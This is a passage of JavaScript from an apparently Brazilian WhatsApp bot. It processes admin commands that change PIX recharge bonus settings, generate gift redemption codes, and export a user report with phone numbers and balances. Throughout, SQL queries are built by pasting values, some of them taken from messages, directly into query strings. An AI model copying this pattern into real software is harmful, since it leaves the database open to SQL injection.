'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/percentpix===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                BONUS_RECARGA_PERCENTUAL = msg[1]
                Array_Digitos_Nao_Deveria = BONUS_RECARGA_PERCENTUAL.match(/[^0-9]/igm);
                if (Array_Digitos_Nao_Deveria != null) {
                    Texto = `⚠️ Apenas números são permitidos.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                BONUS_RECARGA_PERCENTUAL_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL'`).get()["VALOR"]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${BONUS_RECARGA_PERCENTUAL}' WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL'`).run()

                Texto = `*BÔNUS(PERCENTUAL) DE RECARGA PIX ALTERADO COM SUCESSO!*

*ANTES:* ${BONUS_RECARGA_PERCENTUAL_Ant}%

*AGORA:* ${BONUS_RECARGA_PERCENTUAL}%`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/percentpixminimo===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR = msg[1]
                Array_Digitos_Nao_Deveria = BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR.match(/[^0-9]/igm);
                if (Array_Digitos_Nao_Deveria != null) {
                    Texto = `⚠️ Apenas números são permitidos.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR'`).get()["VALOR"]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR}' WHERE PARAMETRO = 'BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR'`).run()

                Texto = `*VALOR MÍNIMO PARA GANHAR BÔNUS DE RECARGA, ALTERADO COM SUCESSO!*

*ANTES:* R$: ${BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR_Ant}

*AGORA:* R$: ${BONUS_RECARGA_PERCENTUAL_ACIMA_VALOR}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳






        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/gift===") > -1 && Adms.includes(Numero)) {
            if (Adms.includes(Numero)) {
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
                msg = Mensagem_Texto.split("===")
                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }

                VALOR_GIFT = msg[1]
                VALOR_GIFT = parseFloat(VALOR_GIFT).toFixed(2);
                CODIGO_GIFT = require('crypto').randomBytes(20).toString('hex')

                await DataBase_Better.prepare(`INSERT INTO GIFTS (COD,VALOR) VALUES ('${CODIGO_GIFT}','${VALOR_GIFT}')`).run()

                Texto1 = `🎁 *RESGATE DE GIFT* 🎁

💰 *VALOR:* R\$:${VALOR_GIFT}

*NÚMERO DO BOT* - wa.me/${NUMERO_PURO_BOT}

*ATENÇÃO*❗
BASTA COPIAR A MENSAGEM A SEGUIR E ENVIAR NO BOT!
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto1}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto2 = `/resgatar ${CODIGO_GIFT}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto2}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/muitogift===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || msg[2] === "" || Array_Total_Igual.length != 6) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            QUANTIDADE_GIFT = msg[1]
            VALORES_GIFT = msg[2]
            VALORES_GIFT = parseFloat(VALORES_GIFT).toFixed(2);


            for (var index = 0; index < parseInt(QUANTIDADE_GIFT); index++) {

                CODIGO_GIFT = require('crypto').randomBytes(20).toString('hex')
                await DataBase_Better.prepare(`INSERT INTO GIFTS (COD,VALOR) VALUES ('${CODIGO_GIFT}','${VALORES_GIFT}')`).run()
                Texto1 = `/resgatar ${CODIGO_GIFT}`

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto1}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }
            await delay(5000)
            Texto2 = `*${QUANTIDADE_GIFT} GIFTS NO VALOR DE ${VALORES_GIFT} GERADOS COM SUCESSO!*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto2}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/relatorio_usuarios") > -1 && Adms.includes(Numero)) {
            Texto = `Gerando relatório detalhado de usuários...`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

            Array_Dados = await DataBase_Better.prepare(`SELECT * FROM CONTATOS`).all();

            data = new Date(parseInt(Date.now())).toLocaleString()
            Nome_File_Visual = `Relatorio Usuarios ${Nome_Dono} Data ${data}.txt`
            console.log(Nome_File_Visual)
            Nome_File_Visual = Nome_File_Visual.toString().replace(/\//igm, ' ');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');
            Nome_File = __dirname + `\\Misc\\${Nome_File_Visual}`

            message = fs.createWriteStream(Nome_File);
            message.write(`CONTATO;INDICADOR;SALDO;DATA REGISTRO;BLOQUEADO\n`);
            for (var index = 0; index < Array_Dados.length; index++) {

                contato = Array_Dados[index]["ID_CONTATO"].replace(/\@c\.us/igm, '');
                data_inserido = new Date(parseInt(Array_Dados[index]["DATA_MS_INSERIDO"])).toLocaleString()
                saldo = parseFloat(Array_Dados[index]["SALDO"]).toFixed(2)
                saldo = saldo.replace(/\./igm, ',')

                message.write(`${contato};${Array_Dados[index]["NUMERO_INDICADOR"]};${saldo};${data_inserido};${Array_Dados[index]["BLOQUEADO"]}\n`);
                if (index === parseInt(Array_Dados.length) - 1) {
                    //console.log("Fim Loop")
                    await delay(2000)
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/relatorio_pixtopgeral===") > -1 && Adms.includes(Numero)) {
            //relatorio_pixtopgeral===MES/DIA/ANO===MES/DIA/ANO
            //relatorio_pixtopgeral===01/06/2022===22/06/2022

            Data_DIV = Mensagem_Texto.split("===")

            Date_Inicio = new Date(Data_DIV[1]).getTime();
            Date_Fim = new Date(Data_DIV[2]).getTime();

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

            if (Data_DIV[1] === "NaN" || Data_DIV[2] === "NaN" || Data_DIV[1] === "" || Data_DIV[2] === "" || Array_Total_Igual.length != 6) {

                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
